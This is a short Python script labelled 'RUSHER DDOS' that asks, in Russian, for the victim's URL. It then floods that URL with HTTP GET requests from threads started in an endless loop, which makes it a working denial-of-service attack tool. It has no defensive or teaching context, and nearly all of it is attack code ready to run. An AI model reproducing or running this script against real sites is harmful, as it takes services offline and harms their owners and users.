import threading
from colorama.ansi import clear_screen
import requests
import colorama
import time
import os
print(colorama.Fore.CYAN + "RUSHER DDOS")
print("loading ...")
time.sleep(3)
os.system('cls' if os.name == 'nt' else 'clear')
print(colorama.Fore.GREEN + "для остоновки скрипта : термукс [ctrl] + [z]" )
url = input(colorama.Fore.RED + "ВВЕДИТЕ URL ЖЕРТВЫ: ")
def dos():
 while True:
  requests.get(url)
  
while True:
 threading.Thread(target=dos).start()